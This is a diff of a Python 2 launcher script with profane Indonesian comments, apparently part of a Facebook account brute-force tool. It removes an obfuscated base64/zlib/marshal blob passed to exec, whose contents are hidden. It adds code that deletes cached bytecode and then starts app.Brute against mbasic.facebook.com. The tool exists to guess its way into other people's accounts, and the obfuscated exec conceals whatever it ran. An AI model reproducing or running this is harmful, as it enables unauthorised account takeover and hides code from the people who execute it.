@@ -1,5 +1,31 @@
 #RECODE MULU KONTOL
 #APA SUSAHNYA TINGGAL PAKAI
 
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJxFVEnPo0YQxd/MZDvlJ+SQw0gcMDuWkigGsxmz2Cw23MC0MZi92a/54QmWJkmp6ul1v1KV1C29O/ItPq/151pQWyFec4PkCBL8xzdIsPmXfyDBBwIQJPuEgA2SfUbAB5J9QeIP5K/Nt1zbPrsr2F8/rfPSv9cw4M/rEnCcJJcr+gb3z5PCkrR9o9N0nntePY18ortPRwpazRivvAwJfb7zicEvPOQYi36Nl9NpW7Q97pSeNngpQ53RC/WwMWLyhPsgCgR9TiqRe7CZxl0i7D7c0lMs+8mZv9E89fT31lGiMkqAdhuImLfbLeGjH6Vsjw7zssAWvbmnHsOTxC5xVMTvYjsDrltCNWeCyN0rWEoK3ZnBZ/Da2Qvjanjp5ip+nTROAIpISGneddwBkvRSA0Lyb2YyiW3eWdUkcNMUaPP4fIGLP5nHMr9y+ElWYlsUCUcYLjSDttSgEG4hpW0tmA2qekeQV0fdfT1Orqbuovhi8kXKj7Tr5Nc2mnDP2VmCXQ/gYESwdFqZkkZsClEdOB5jM+OeMo7JUKvK7BMMHW/3sa/DeQ5dendrCaLG0sV4Hs/ZeHUc9DWZIsxU0OWilY+g93r55tkMG5xRTmJEJ7yolcnF8vr2KjNq7M05lqkAOPR+nrDUql9VxW9F6NXO9lWmNVVU22DpGEJCD4WgW1bNXqy0apPIlmWVqDO1ixkU6GdVEhvvoYVUHh36we+30WwkMGjY1iiI5pCpREGR+rOJfB5ar8p4Bgcp9vET70YPAfRaR6kmao06CbGi2VYU7eIvV3mkUa+FQ9nPd90ZyFNzBeAhF6LGEuDW12oGSQF7AAg1NYdMpVwaHEReMwsxahc4kKkE3Yt4s2Cm2hN16ooOVpSz55JizcalcCDSweHk/DU18vHVNXFHyuZZXUyOIrzccJoL2kKWfjqjDgDVLhnveHRPQvVOM4kiRsUd4rp7ZsX74arj/I5aHI+yxUfR4PVziwXHcSC8LFrMWKH2o0S6SVIBlkmzE1MGdXX3VBAflejl5hg+bvHBf8r0RF1YXyks7XHYqwYZ+9whWiZ4NRou5f02jnXPMc9BGbOV6YEgzavZBIY/WRZLj+Rp4Awo1PGOaDxs37FWoSZDch1L7tSEJGd2QrprLHPIFoKgp+sxNmTyHmNmGZ8J7GHhCoc6UYHthN0lNB50G2KlklEUdmLacM6G6ondWDKfPFJtmQ7bC/buqOm/f/1u9Yfu+xWKsIXPMO/eTrTkadS9lSiEgKG6LyvNqzCG3U9vewL3qqjb9e+6H989DPW+icHXt5H9D/At2v06t/1FPXQ/rKffiiruc/DH5i1/rPDr5h/T04cA"))))
+#!usr/bin/python2.7
+# coding=utf-8
+
+import os, sys, shutil
+from app import main as app
+
+base_url = 'https://mbasic.facebook.com'
+
+if sys.version_info.major != 2:
+	sys.exit('\n\033[0;97m{\033[0;92mWARNING\033[0;97m} \033[0;91mTools ini menggunakan bahasa python2.\nsegera upgrade terlebih dahulu\033[0m')
+
+try: shutil.rmtree('app/__pycache__')
+except: pass
+try: shutil.rmtree('src/__pycache__')
+except: pass
+
+for filename in os.listdir('app'):
+	if filename[-3:] == 'pyc':
+		try: os.remove('app/'+filename)
+		except: pass
+
+for filename in os.listdir('src'):
+	if filename[-3:] == 'pyc':
+		try: os.remove('src/'+filename)
+		except: pass
+#Lo Kontol#
+awokawokawok = app.Brute(base_url)
+awokawokawok.start()
